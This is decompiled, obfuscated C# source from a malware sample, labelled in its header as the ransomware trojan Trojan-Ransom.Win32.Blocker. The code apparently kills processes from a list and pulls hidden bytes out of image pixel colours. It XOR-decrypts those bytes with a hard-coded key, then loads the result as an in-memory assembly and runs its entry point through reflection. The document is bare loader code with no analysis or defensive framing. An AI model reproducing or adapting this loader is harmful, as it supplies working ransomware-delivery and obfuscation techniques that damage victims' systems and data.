// Decompiled with JetBrains decompiler
// Type: Ⴐ.Ⴅ
// Assembly: yzalr14k, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 73F4068F-A403-47FB-B5CB-C14B2659D9D3
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.jvnh-1a7b6e0d12ac2336ab057d2b6e6b7694d384e5bc974736cb0a175e5c77f3e4e4.exe

using \u0006;
using \u0008;
using Microsoft.VisualBasic.CompilerServices;
using SmartAssembly.Attributes;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Policy;
using System.Threading;

namespace Ⴐ
{
  internal sealed class Ⴅ
  {
    private static readonly char[] Ⴐ;
    private static readonly char[] Ⴅ;
    private static readonly string[] Ⴃ;
    internal static Ⴐ.Ⴅ.ႰႰ Ⴍ;
    private static bool Ⴅ;

    static string Ⴗ(bool Ⴄ, string Ⴅ, string Ⴗ)
    {
label_3:
      int num1 = 24;
      string str;
      while (true)
      {
        int num2;
        sbyte num3;
        double num4;
        float num5;
        uint num6;
        int num7;
        int num8;
        int num9;
        int num10;
        int num11;
        int num12;
        switch (num1)
        {
          case 0:
            num7 = 10;
            goto label_45;
          case 1:
            num2 = 9;
            num1 = 15;
            continue;
          case 2:
            num4 = 20.0;
            num2 = 12;
            num1 = 15;
            continue;
          case 3:
            num1 = true ? 0 : 10;
            continue;
          case 4:
            num8 = 3;
            goto label_36;
          case 5:
            num9 = 8;
            goto label_50;
          case 6:
            num1 = num4 <= 63.0 ? 12 : 4;
            continue;
          case 7:
            num2 = 0;
            num1 = 15;
            continue;
          case 8:
            num1 = true ? 31 : 9;
            continue;
          case 9:
            num10 = 13;
            goto label_54;
          case 10:
            num7 = 10;
            goto label_45;
          case 11:
            str = \u0002.Ⴐ.Ⴄ.Ⴐ(\u0001.Ⴀ(735, 704), Ⴐ.Ⴅ.Ⴓ((ushort) 20778, 32107.39, \u0001.Ⴗ(Ⴗ, 975, 1023)), 802, 784);
            num1 = 1;
            continue;
          case 12:
            num8 = 12;
            goto label_36;
          case 13:
            num11 = 0;
            break;
          case 14:
label_41:
            num1 = 15;
            continue;
          case 15:
            int num13;
            switch (num2)
            {
              case 0:
                num13 = 30;
                break;
              case 1:
                num13 = 6;
                break;
              case 2:
                num13 = 3;
                break;
              case 3:
                num13 = 25;
                break;
              case 4:
                num13 = 24;
                break;
              case 5:
                num13 = 3;
                break;
              case 6:
                num13 = 8;
                break;
              case 7:
                num13 = 32;
                break;
              case 8:
                num13 = 19;
                break;
              case 9:
                num13 = 17;
                break;
              case 10:
                num13 = 23;
                break;
              case 11:
                num13 = 18;
                break;
              case 12:
                num13 = 16;
                break;
              case 13:
                num13 = 11;
                break;
              case 14:
                num13 = 32;
                break;
              case 15:
                num13 = 2;
                break;
              default:
                num13 = 32;
                break;
            }
            num1 = num13;
            continue;
          case 16:
            num5 = 2f;
            goto case 7;
          case 17:
            goto label_58;
          case 18:
            ++num4;
            num1 = 6;
            continue;
          case 19:
            checked { ++num6; }
            num1 = num6 <= 117U ? 5 : 22;
            continue;
          case 20:
            num1 = 15;
            continue;
          case 22:
            num9 = 6;
            goto label_50;
          case 23:
            num6 = 4U;
            num2 = 8;
            num1 = 15;
            continue;
          case 24:
            num3 = (sbyte) 6;
            num2 = 15;
            num1 = 15;
            continue;
          case 25:
            checked { ++num3; }
            num1 = num3 <= (sbyte) 100 ? 29 : 28;
            continue;
          case 26:
            goto label_3;
          case 27:
            num11 = 11;
            break;
          case 28:
            num12 = 5;
            goto label_40;
          case 29:
            num12 = 15;
            goto label_40;
          case 30:
            ++num5;
            num1 = (double) num5 <= 74.0 ? 13 : 27;
            continue;
          case 31:
            num10 = 13;
            goto label_54;
          case 32:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Ⴐ.Ⴅ.Ⴗ);
            num2 = 4;
            goto case 20;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Ⴐ.Ⴅ.Ⴗ);
            num1 = 26;
            continue;
        }
        num2 = num11;
        num1 = 15;
        continue;
label_36:
        num2 = num8;
        num1 = 15;
        continue;
label_40:
        num2 = num12;
        goto label_41;
label_45:
        num2 = num7;
        num1 = 15;
        continue;
label_50:
        num2 = num9;
        num1 = 15;
        continue;
label_54:
        num2 = num10;
        num1 = 15;
      }
label_58:
      return str;
    }

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress")]
    static extern IntPtr Ⴗ(IntPtr Ⴗ, string Ⴃ);

    static void Ⴗ()
    {
label_0:
      int num1;
      int num2;
      try
      {
        int num3 = 26;
label_1:
        int num4;
        while (true)
        {
          int num5;
          string Ⴅ;
          string Ⴗ1;
          string[] strArray;
          int index1;
          Process[] processArray;
          int index2;
          Process Ⴗ2;
          int num6;
          int num7;
          int num8;
          int num9;
          int num10;
          int num11;
          int num12;
          switch (num3)
          {
            case 0:
              num6 = 11;
              goto label_50;
            case 1:
              num7 = 0;
              goto label_66;
            case 2:
              num8 = num2;
              goto label_54;
            case 3:
              goto label_77;
            case 4:
              goto label_76;
            case 5:
              num7 = 10;
              goto label_66;
            case 6:
              num4 = 7;
              num3 = 39;
              continue;
            case 7:
              num7 = 1;
              goto label_66;
            case 8:
              \u0001.Ⴗ(390, 435);
              num1 = -2;
              num5 = 1;
              num3 = 27;
              continue;
            case 9:
              string Ⴈ = Ⴐ.Ⴅ.Ⴗ(false, Ⴅ, Ⴗ1);
              char[] chArray1 = new char[1];
              char[] chArray2 = chArray1;
              Ⴅ = Ⴐ.Ⴅ.Ⴜ(1528405764, 8);
              Ⴗ1 = Ⴐ.Ⴅ.Ⴜ(1528405760, 6);
              int num13 = (int) PoweredByAttribute.ႳႷ.ႳႳ(Ⴐ.Ⴅ.Ⴗ(false, Ⴅ, Ⴗ1), 57, 69);
              chArray2[0] = (char) num13;
              char[] Ⴀ = chArray1;
              strArray = \u0001.Ⴈ(Ⴈ, Ⴀ, 422, 497);
              num3 = 32;
              continue;
            case 10:
              num9 = 1;
              goto label_83;
            case 11:
            case 41:
              goto label_95;
            case 12:
              index2 = 0;
              num5 = 22;
              num3 = 27;
              continue;
            case 13:
              num10 = 3;
              break;
            case 14:
              num7 = 14;
              goto label_66;
            case 15:
              num9 = num1;
              goto label_83;
            case 16:
              num3 = index2 < processArray.Length ? 13 : 31;
              continue;
            case 17:
label_44:
              num3 = 27;
              continue;
            case 18:
              num4 = 2;
              num3 = 29;
              continue;
            case 19:
              num7 = 18;
              goto label_66;
            case 20:
              num7 = 11;
              goto label_66;
            case 22:
              goto label_110;
            case 23:
              num11 = 7;
              goto label_79;
            case 24:
              num4 = 3;
              index1 = 0;
              num5 = 11;
              num3 = 27;
              continue;
            case 25:
              num7 = 5;
              goto label_66;
            case 27:
              int num14;
              switch (num5)
              {
                case 0:
                  num14 = 46;
                  break;
                case 1:
                  num14 = 18;
                  break;
                case 2:
                  num14 = 8;
                  break;
                case 3:
                  num14 = 45;
                  break;
                case 4:
                  num14 = 29;
                  break;
                case 5:
                  num14 = 35;
                  break;
                case 6:
                  num14 = 11;
                  break;
                case 7:
                  num14 = 15;
                  break;
                case 8:
                  num14 = 9;
                  break;
                case 9:
                  num14 = 2;
                  break;
                case 10:
                  num14 = 6;
                  break;
                case 11:
                  num14 = 30;
                  break;
                case 12:
                  num14 = 12;
                  break;
                case 13:
                  num14 = 41;
                  break;
                case 14:
                  num14 = 24;
                  break;
                case 15:
                  num14 = 39;
                  break;
                case 16:
                  num14 = 10;
                  break;
                case 17:
                  num14 = 37;
                  break;
                case 18:
                  num14 = 22;
                  break;
                case 19:
                  num14 = 4;
                  break;
                case 20:
                  num14 = 34;
                  break;
                case 21:
                  num14 = 8;
                  break;
                case 22:
                  num14 = 16;
                  break;
                default:
                  num14 = 8;
                  break;
              }
              num3 = num14;
              continue;
            case 28:
              num7 = 13;
              goto label_66;
            case 29:
              Ⴅ = Ⴐ.Ⴅ.Ⴜ(1528405889, 0);
              Ⴗ1 = Ⴐ.Ⴅ.Ⴜ(1528405905, 4);
              num5 = 8;
              num3 = 27;
              continue;
            case 30:
              num4 = 4;
              processArray = PoweredByAttribute.Ⴈ(strArray[index1], 337, 303);
              num5 = 12;
              num3 = 27;
              continue;
            case 31:
              num10 = 10;
              break;
            case 32:
              num5 = 14;
              num3 = 27;
              continue;
            case 33:
              num12 = 6;
              goto label_89;
            case 34:
              num8 = num2 + 1;
              goto label_54;
            case 35:
              num4 = 5;
              num3 = 37;
              continue;
            case 36:
              num3 = index1 <= 11 ? 0 : 38;
              continue;
            case 37:
              PoweredByAttribute.Ⴐ(Ⴗ2, 122, 121);
              checked { ++index2; }
              num5 = 0;
              num3 = 27;
              continue;
            case 38:
              num6 = 18;
              goto label_50;
            case 39:
              checked { ++index1; }
              goto case 36;
            case 40:
              num12 = 20;
              goto label_89;
            case 42:
              num12 = 6;
              goto label_89;
            case 43:
              num7 = 13;
              goto label_66;
            case 44:
              num11 = 16;
              goto label_79;
            case 45:
              Ⴗ2 = processArray[index2];
              num5 = 5;
              num3 = 27;
              continue;
            case 46:
              num4 = 6;
              num5 = 22;
              num3 = 27;
              continue;
            default:
              num5 = 21;
              num3 = 27;
              continue;
          }
          num5 = num10;
          goto label_44;
label_50:
          num5 = num6;
          num3 = 27;
          continue;
label_54:
          num2 = 0;
          int num15;
          switch (num8)
          {
            case 0:
              num15 = 28;
              break;
            case 1:
              goto label_0;
            case 2:
              num15 = 7;
              break;
            case 3:
              num15 = 14;
              break;
            case 4:
              num15 = 20;
              break;
            case 5:
              num15 = 25;
              break;
            case 6:
              num15 = 1;
              break;
            case 7:
              num15 = 5;
              break;
            case 8:
              num15 = 19;
              break;
            default:
              num15 = 43;
              break;
          }
          num3 = num15;
          continue;
label_66:
          num5 = num7;
          num3 = 27;
          continue;
label_79:
          num5 = num11;
          num3 = 27;
          continue;
label_83:
          int num16;
          switch (num9)
          {
            case 0:
              num16 = 33;
              break;
            case 1:
              num16 = 40;
              break;
            default:
              num16 = 42;
              break;
          }
          num3 = num16;
          continue;
label_89:
          num5 = num12;
          num3 = 27;
        }
label_76:
        num2 = num4;
label_77:
        num3 = num1 > -2 ? 23 : 44;
        goto label_1;
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        SmartAssembly.Attributes.Ⴓ.Ⴓ(ex, 144, 232);
        goto label_76;
      }
label_95:
      int num17 = 9;
label_96:
      while (true)
      {
        int num18;
        int num19;
        switch (num17)
        {
          case 0:
          case 6:
            goto label_109;
          case 1:
          case 2:
            goto label_110;
          case 3:
            int num20;
            switch (num18)
            {
              case 0:
                num20 = 0;
                break;
              case 1:
                num20 = 0;
                break;
              case 2:
                num20 = 8;
                break;
              case 3:
                num20 = 2;
                break;
              case 4:
                num20 = 7;
                break;
              case 5:
                num20 = 8;
                break;
              case 6:
                num20 = 0;
                break;
              case 7:
                num20 = 2;
                break;
              default:
                num20 = 0;
                break;
            }
            num17 = num20;
            continue;
          case 4:
            goto label_92;
          case 5:
            num19 = 4;
            break;
          case 7:
            goto label_75;
          case 8:
            goto label_114;
          case 10:
            num19 = 5;
            break;
          default:
            num18 = 6;
            num17 = 3;
            continue;
        }
        num18 = num19;
        num17 = 3;
      }
label_92:
      return;
label_75:
      return;
label_109:
      throw SmartAssembly.Attributes.Ⴓ.Ⴃ.Ⴀ.Ⴍ(-2146828237, 40, 74);
label_114:
      ProjectData.ClearProjectError();
      return;
label_110:
      num17 = num2 == 0 ? 5 : 10;
      goto label_96;
    }

    static byte[] Ⴗ(int Ⴀ)
    {
label_3:
      int num1 = 16;
      byte[] numArray;
      while (true)
      {
        int num2;
        long num3;
        string str;
        int Ⴐ;
        int num4;
        Color Ⴀ1;
        int num5;
        int num6;
        int num7;
        int num8;
        switch (num1)
        {
          case 0:
            num5 = 9;
            break;
          case 1:
            num6 = 0;
            goto label_31;
          case 2:
            num6 = 1;
            goto label_31;
          case 3:
            num2 = 11;
            num1 = 25;
            continue;
          case 4:
            checked { ++Ⴐ; }
            num2 = 7;
            num1 = 25;
            continue;
          case 5:
            num1 = 3;
            continue;
          case 6:
          case 14:
            num7 = 4;
            goto label_43;
          case 7:
            str = Ⴐ.Ⴅ.Ⴜ(1528405760, 1);
            Ⴐ = 0;
            num4 = PoweredByAttribute.ႳႷ.ႳႠ(str, 220, 230);
            num1 = 15;
            continue;
          case 8:
            num1 = 4;
            continue;
          case 9:
            num2 = 13;
            goto case 22;
          case 10:
            num8 = 5;
            goto label_37;
          case 11:
            checked { ++num3; }
            num1 = 28;
            continue;
          case 12:
            num3 = 10L;
            num2 = 0;
            num1 = 25;
            continue;
          case 13:
            num2 = 6;
            num1 = 25;
            continue;
          case 15:
            num2 = 7;
            num1 = 25;
            continue;
          case 16:
            num1 = false ? 19 : 0;
            continue;
          case 17:
            num8 = 5;
            goto label_37;
          case 18:
            goto label_3;
          case 19:
            num5 = 1;
            break;
          case 20:
            Ⴐ.Ⴅ.Ⴗ(str, Ⴐ, 370, 300);
            num1 = false ? 17 : 10;
            continue;
          case 22:
            num1 = 25;
            continue;
          case 23:
            num7 = 10;
            goto label_43;
          case 24:
            Ⴀ1 = PoweredByAttribute.ႳႷ.ႳႰ(Ⴀ, 457, 499);
            numArray = new byte[4];
            goto case 5;
          case 25:
            int num9;
            switch (num2)
            {
              case 0:
                num9 = 11;
                break;
              case 1:
                num9 = 7;
                break;
              case 2:
                num9 = 4;
                break;
              case 3:
                num9 = 16;
                break;
              case 4:
                num9 = 20;
                break;
              case 5:
                num9 = 8;
                break;
              case 6:
                num9 = 31;
                break;
              case 7:
                num9 = 26;
                break;
              case 8:
                num9 = 28;
                break;
              case 9:
                num9 = 12;
                break;
              case 10:
                num9 = 24;
                break;
              case 11:
                num9 = 27;
                break;
              case 12:
                num9 = 7;
                break;
              case 13:
                num9 = 29;
                break;
              case 14:
                num9 = 30;
                break;
              default:
                num9 = 30;
                break;
            }
            num1 = num9;
            continue;
          case 26:
            num1 = Ⴐ < num4 ? 6 : 23;
            continue;
          case 27:
            numArray[0] = Ⴐ.Ⴅ.ႨႨ(ref Ⴀ1, 133, 136);
            numArray[1] = Ⴐ.Ⴅ.ႨႨ(ref Ⴀ1, 367, 353);
            num1 = 13;
            continue;
          case 28:
            num1 = num3 <= 104L ? 1 : 2;
            continue;
          case 29:
            goto label_53;
          case 30:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Ⴐ.Ⴅ.Ⴗ);
            num2 = 3;
            num1 = 25;
            continue;
          case 31:
            numArray[2] = SmartAssembly.Attributes.Ⴓ.Ⴃ.Ⴀ.Ⴈ(ref Ⴀ1, 250, 147);
            numArray[3] = SmartAssembly.Attributes.Ⴓ.Ⴃ.Ⴀ.Ⴈ(ref Ⴀ1, 281, 371);
            num1 = 9;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Ⴐ.Ⴅ.Ⴗ);
            num1 = 18;
            continue;
        }
        num2 = num5;
        num1 = 25;
        continue;
label_31:
        num2 = num6;
        num1 = 25;
        continue;
label_37:
        num2 = num8;
        num1 = 25;
        continue;
label_43:
        num2 = num7;
        num1 = 25;
      }
label_53:
      return numArray;
    }

    [DllImport("kernel32.dll", EntryPoint = "GetModuleHandle")]
    static extern IntPtr Ⴓ(string Ⴓ);

    static int Ⴓ(int Ⴄ, byte[] Ⴗ)
    {
label_3:
      int num1 = 23;
      Color color;
      while (true)
      {
        int num2;
        short num3;
        ushort num4;
        Decimal limit;
        Decimal num5;
        int num6;
        int num7;
        int num8;
        switch (num1)
        {
          case 0:
            checked { ++num3; }
            num1 = num3 <= (short) 21 ? 11 : 21;
            continue;
          case 1:
            int num9;
            switch (num2)
            {
              case 0:
                num9 = 18;
                break;
              case 1:
                num9 = 2;
                break;
              case 2:
                num9 = 13;
                break;
              case 3:
                num9 = 12;
                break;
              case 4:
                num9 = 24;
                break;
              case 5:
                num9 = 18;
                break;
              case 6:
                num9 = 8;
                break;
              case 7:
                num9 = 0;
                break;
              case 8:
                num9 = 12;
                break;
              case 9:
                num9 = 22;
                break;
              case 10:
                num9 = 23;
                break;
              case 11:
                num9 = 17;
                break;
              case 12:
                num9 = 3;
                break;
              case 13:
                num9 = 16;
                break;
              default:
                num9 = 2;
                break;
            }
            num1 = num9;
            continue;
          case 2:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Ⴐ.Ⴅ.Ⴓ);
            num2 = 10;
            num1 = 1;
            continue;
          case 3:
            num4 = (ushort) 8;
            num2 = 0;
            num1 = 1;
            continue;
          case 4:
            num1 = 1;
            continue;
          case 5:
            num6 = 11;
            goto label_33;
          case 6:
            checked { ++num4; }
            num2 = 9;
            num1 = 1;
            continue;
          case 7:
            goto label_3;
          case 8:
            num1 = 3;
            continue;
          case 9:
            num7 = 4;
            goto label_39;
          case 11:
            num8 = 7;
            break;
          case 12:
            num5 = \u0001.Ⴀ(num5, 1M, 875, 851);
            num2 = 13;
            num1 = 1;
            continue;
          case 13:
            goto label_44;
          case 14:
            num2 = 2;
            goto case 4;
          case 15:
          case 22:
            num1 = num4 <= (ushort) 87 ? 20 : 9;
            continue;
          case 16:
            num1 = ObjectFlowControl.ForLoopControl.ForNextCheckDec(num5, limit, 1M) ? 19 : 5;
            continue;
          case 17:
            Ⴐ.Ⴅ.ႣႨ(936, 964);
            goto case 6;
          case 18:
            limit = 94M;
            num5 = 9M;
            num2 = 13;
            num1 = 1;
            continue;
          case 19:
            num6 = 3;
            goto label_33;
          case 20:
            num7 = 0;
            goto label_39;
          case 21:
            num8 = 6;
            break;
          case 23:
            num3 = (short) 9;
            num2 = 7;
            num1 = 1;
            continue;
          case 24:
            color = \u0001.Ⴀ((int) Ⴗ[checked (Ⴄ + 3)], (int) Ⴗ[checked (Ⴄ + 2)], (int) Ⴗ[checked (Ⴄ + 1)], (int) Ⴗ[Ⴄ], 820, 845);
            num1 = 14;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Ⴐ.Ⴅ.Ⴓ);
            num1 = 7;
            continue;
        }
        num2 = num8;
        num1 = 1;
        continue;
label_33:
        num2 = num6;
        num1 = 1;
        continue;
label_39:
        num2 = num7;
        num1 = 1;
      }
label_44:
      return SmartAssembly.Attributes.Ⴓ.Ⴃ.Ⴃ(ref color, 345, 261);
    }

    static void Ⴜ(object Ⴅ)
    {
      int num1 = 13;
      while (true)
      {
        int num2;
        sbyte num3;
        float num4;
        MethodInfo methodInfo;
        int num5;
        int num6;
        int num7;
        switch (num1)
        {
          case 0:
            num5 = 2;
            goto label_28;
          case 1:
            int num8;
            switch (num2)
            {
              case 0:
                num8 = 11;
                break;
              case 1:
                num8 = 10;
                break;
              case 2:
                num8 = 4;
                break;
              case 3:
                num8 = 8;
                break;
              case 4:
                num8 = 12;
                break;
              case 5:
                num8 = 12;
                break;
              case 6:
                num8 = 16;
                break;
              case 7:
                num8 = 15;
                break;
              case 8:
                num8 = 3;
                break;
              case 9:
                num8 = 4;
                break;
              case 10:
                num8 = 21;
                break;
              case 11:
                num8 = 14;
                break;
              default:
                num8 = 11;
                break;
            }
            num1 = num8;
            continue;
          case 2:
            num6 = 6;
            goto label_35;
          case 3:
            goto label_40;
          case 4:
            num1 = 15;
            continue;
          case 5:
            num2 = 8;
            num1 = 1;
            continue;
          case 6:
            num7 = 1;
            break;
          case 7:
            num7 = 3;
            break;
          case 8:
            ++num4;
            num1 = (double) num4 <= 85.0 ? 7 : 6;
            continue;
          case 9:
label_29:
            num1 = 1;
            continue;
          case 10:
            checked { ++num3; }
            num1 = num3 <= (sbyte) 95 ? 0 : 20;
            continue;
          case 11:
            num3 = (sbyte) 18;
            num2 = 2;
            num1 = 1;
            continue;
          case 12:
            Ⴐ.Ⴅ.Ⴗ((MethodBase) methodInfo, (object) null, (object[]) null, 613, 613);
            num2 = 8;
            num1 = 1;
            continue;
          case 14:
            methodInfo = Ⴐ.Ⴅ.ႨႰ(PoweredByAttribute.ႤႤ((byte[]) Ⴅ, 405, 466), 458, 489);
            goto case 18;
          case 15:
            num4 = 1f;
            num2 = 3;
            goto case 17;
          case 16:
            SmartAssembly.Attributes.Ⴓ.Ⴃ.Ⴀ.Ⴐ((MethodBase) methodInfo, (object) null, new object[1]
            {
              (object) new string[0]
            }, 998, 950);
            num1 = 5;
            continue;
          case 17:
            num1 = 1;
            continue;
          case 18:
            num2 = 10;
            num1 = 1;
            continue;
          case 19:
            num6 = 4;
            goto label_35;
          case 20:
            num5 = 11;
            goto label_28;
          case 21:
            num1 = \u0001.Ⴓ((MethodBase) methodInfo, 779, 822).Length != 0 ? 2 : 19;
            continue;
          default:
            num2 = 0;
            num1 = 1;
            continue;
        }
        num2 = num7;
        num1 = 1;
        continue;
label_28:
        num2 = num5;
        goto label_29;
label_35:
        num2 = num6;
        num1 = 1;
      }
label_40:;
    }

    static byte[] Ⴓ(ushort Ⴓ, double Ⴅ, byte[] Ⴀ)
    {
label_3:
      int num1 = 12;
      while (true)
      {
        int num2;
        string str;
        int Ⴐ;
        int num3;
        byte[] numArray1;
        byte[] numArray2;
        int length;
        int num4;
        int index;
        int num5;
        int num6;
        switch (num1)
        {
          case 0:
            numArray1[3] = (byte) 48;
            numArray1[4] = (byte) 213;
            num1 = 20;
            continue;
          case 1:
            int num7;
            switch (num2)
            {
              case 0:
                num7 = 20;
                break;
              case 1:
                num7 = 23;
                break;
              case 2:
                num7 = 30;
                break;
              case 3:
                num7 = 12;
                break;
              case 4:
                num7 = 22;
                break;
              case 5:
                num7 = 13;
                break;
              case 6:
                num7 = 9;
                break;
              case 7:
                num7 = 17;
                break;
              case 8:
                num7 = 25;
                break;
              case 9:
                num7 = 14;
                break;
              case 10:
                num7 = 11;
                break;
              case 11:
                num7 = 18;
                break;
              case 12:
                num7 = 29;
                break;
              case 13:
                num7 = 3;
                break;
              case 14:
                num7 = 22;
                break;
              case 15:
                num7 = 9;
                break;
              default:
                num7 = 23;
                break;
            }
            num1 = num7;
            continue;
          case 2:
            num1 = 21;
            continue;
          case 3:
            checked { ++index; }
            num2 = 8;
            num1 = 1;
            continue;
          case 5:
            num5 = 10;
            goto label_49;
          case 6:
            num5 = 5;
            goto label_49;
          case 7:
            num6 = 9;
            break;
          case 8:
            num2 = 7;
            num1 = 1;
            continue;
          case 9:
            numArray1[8] = (byte) 226;
            numArray1[9] = (byte) 228;
            numArray1[10] = (byte) 56;
            goto case 2;
          case 10:
            num2 = 13;
            num1 = 1;
            continue;
          case 11:
            Ⴀ[index] = (byte) ((int) Ⴀ[index] ^ (int) numArray2[index % length]);
            num1 = 10;
            continue;
          case 12:
            str = Ⴐ.Ⴅ.Ⴜ(1528405787, 0);
            Ⴐ = 0;
            num3 = PoweredByAttribute.ႳႷ.ႳႠ(str, 180, 142);
            num1 = 8;
            continue;
          case 13:
            goto label_51;
          case 14:
            Ⴐ.Ⴅ.Ⴗ(str, Ⴐ, 46, 112);
            checked { ++Ⴐ; }
            num1 = 27;
            continue;
          case 15:
            goto label_3;
          case 16:
            num2 = 8;
            num1 = 1;
            continue;
          case 17:
            num1 = Ⴐ < num3 ? 7 : 26;
            continue;
          case 18:
            numArray1[2] = (byte) 117;
            goto case 0;
          case 19:
            num2 = 15;
            num1 = 1;
            continue;
          case 20:
            num2 = 2;
            num1 = 1;
            continue;
          case 21:
            num2 = 14;
            num1 = 1;
            continue;
          case 22:
            numArray2 = numArray1;
            length = numArray2.Length;
            num4 = checked (Ⴀ.Length - 1);
            index = 0;
            num1 = 16;
            continue;
          case 23:
          case 28:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Ⴐ.Ⴅ.Ⴓ);
            num2 = 3;
            num1 = 1;
            continue;
          case 24:
            num2 = 11;
            num1 = 1;
            continue;
          case 25:
            num1 = index <= num4 ? 5 : 6;
            continue;
          case 26:
            num6 = 12;
            break;
          case 27:
            num2 = 7;
            num1 = 1;
            continue;
          case 29:
            numArray1 = new byte[11];
            numArray1[0] = (byte) 81;
            numArray1[1] = (byte) 232;
            num1 = 24;
            continue;
          case 30:
            numArray1[5] = (byte) 20;
            numArray1[6] = (byte) 167;
            numArray1[7] = (byte) 49;
            num1 = 19;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Ⴐ.Ⴅ.Ⴓ);
            num1 = 15;
            continue;
        }
        num2 = num6;
        num1 = 1;
        continue;
label_49:
        num2 = num5;
        num1 = 1;
      }
label_51:
      return Ⴀ;
    }

    static Ⴅ()
    {
      int num1 = 11;
      int num2;
      char[] chArray;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 8:
            chArray[1] = '\u0BF1';
            num1 = 3;
            continue;
          case 1:
            chArray[0] = 'ᩆ';
            Ⴐ.Ⴅ.Ⴃ = new string[35];
            num1 = 13;
            continue;
          case 2:
            int num3;
            switch (num2)
            {
              case 0:
                num3 = 4;
                break;
              case 1:
                num3 = 9;
                break;
              case 2:
                num3 = 10;
                break;
              case 3:
                num3 = 5;
                break;
              case 4:
                num3 = 6;
                break;
              case 5:
                num3 = 9;
                break;
              case 6:
                num3 = 12;
                break;
              case 7:
                num3 = 9;
                break;
              default:
                num3 = 5;
                break;
            }
            num1 = num3;
            continue;
          case 3:
            num2 = 2;
            num1 = 2;
            continue;
          case 4:
            goto label_24;
          case 5:
            Ⴐ.Ⴅ.Ⴓ();
            Ⴐ.Ⴅ.Ⴅ = new char[699]
            {
              char.MinValue,
              '\a',
              char.MinValue,
              'ᩨ',
              '\u0BD2',
              'ᆃ',
              '᭷',
              '◸',
              'ዑ',
              '㰵',
              '\u0001',
              '\u0006',
              char.MinValue,
              '\u0BD1',
              'ᆏ',
              'ᬤ',
              '►',
              'ኵ',
              '㰛',
              '\u0002',
              '\u0003',
              char.MinValue,
              'ᆫ',
              '\u1B4C',
              '◇',
              '\u0003',
              '\u001C',
              char.MinValue,
              '᭸',
              '▸',
              'ኦ',
              '㰶',
              '㈁',
              'ᨴ',
              '\u0B81',
              'ᆨ',
              'ᬨ',
              '◙',
              'ኴ',
              '㰊',
              '\u3228',
              'ᨎ',
              '\u0BC5',
              'ᇦ',
              '᭱',
              '◍',
              'ኵ',
              '㰞',
              '㉩',
              'ᨒ',
              '\u0B8B',
              'ᆴ',
              '᭚',
              '◫',
              'ኣ',
              '㰔',
              '\u0004',
              '\u0005',
              char.MinValue,
              '◭',
              'ኆ',
              '㰈',
              '㈔',
              'ᩳ',
              '\u0005',
              '\a',
              char.MinValue,
              'ኡ',
              '㰖',
              '㉽',
              'ᨠ',
              'த',
              'ᆢ',
              'ᬪ',
              '\u0006',
              ',',
              char.MinValue,
              '㰻',
              '㉧',
              'ᨗ',
              '\u0B98',
              'ᆅ',
              '᭻',
              '◻',
              'ኀ',
              '㰣',
              '㈕',
              'ᨧ',
              'ண',
              'ᆧ',
              '᭑',
              '◚',
              'ዃ',
              '㰳',
              '\u3227',
              'ᨢ',
              '\u0B97',
              'ᆢ',
              '᭷',
              '◹',
              'ኵ',
              '㰈',
              '㈳',
              'ᨿ',
              '\u0B80',
              'ᆴ',
              'ᭈ',
              '◘',
              '\u12C7',
              '㰗',
              '㉠',
              'ᨍ',
              'ு',
              'ᆷ',
              '᭺',
              '◅',
              'ኰ',
              '㰰',
              '㈊',
              '\u1A1C',
              '\u0BA5',
              '\a',
              '\u0004',
              char.MinValue,
              '㉽',
              'ᨥ',
              'ி',
              'ᆣ',
              '\b',
              '\b',
              char.MinValue,
              'ᨌ',
              'ை',
              'ᆢ',
              '᭻',
              '◎',
              'ኧ',
              '㰩',
              '㉭',
              '\t',
              '\u0002',
              char.MinValue,
              'ௌ',
              'ᇾ',
              '\n',
              '\u0010',
              char.MinValue,
              'ᆖ',
              'ᭀ',
              '◼',
              'ኳ',
              '㰈',
              '㈛',
              'ᨢ',
              'உ',
              'ᇣ',
              '᭛',
              '▤',
              '\u12BF',
              '㰴',
              '㈖',
              '᩶',
              'ௌ',
              '\v',
              '\b',
              char.MinValue,
              '\u1B7E',
              '◷',
              '\u12C1',
              '㰡',
              '㈏',
              'ᩩ',
              '\u0BAB',
              'ᆬ',
              '\f',
              ' ',
              char.MinValue,
              '◀',
              'ኘ',
              '㱪',
              '㈘',
              '᨞',
              'ஃ',
              'ᆐ',
              'ᬭ',
              '◣',
              '\u12B6',
              '㰊',
              '㈉',
              'ᨶ',
              'ு',
              'ᆽ',
              'ᬩ',
              '◦',
              'ኦ',
              '㰜',
              '㈆',
              'ᨮ',
              '\u0BA6',
              'ᆰ',
              '᭐',
              '◚',
              'ኘ',
              '㰿',
              '㈈',
              'ᨕ',
              'உ',
              'ᆓ',
              'ᬤ',
              '\r',
              '\u0004',
              char.MinValue,
              'ኬ',
              '㰉',
              '\u3220',
              'ᨋ',
              '\u000E',
              '$',
              char.MinValue,
              '㰕',
              '㈿',
              '᩶',
              'ஹ',
              'ᆊ',
              '᭫',
              '◍',
              'ዃ',
              '㰶',
              '㈑',
              'ᨖ',
              'ந',
              'ᆽ',
              'ᬨ',
              '▿',
              'ኛ',
              '㰬',
              '㈒',
              '᩷',
              'ல',
              'ᆡ',
              '᭑',
              '◗',
              'ኳ',
              '㰹',
              '㈿',
              'ᩴ',
              '\u0BBA',
              'ᆆ',
              '᭝',
              '◜',
              'ኦ',
              '㰛',
              '㈁',
              '᩻',
              'ௌ',
              '\u000F',
              '\u0005',
              char.MinValue,
              '㉢',
              'ᩥ',
              'ொ',
              'ᆋ',
              '᭧',
              '\u0010',
              '$',
              char.MinValue,
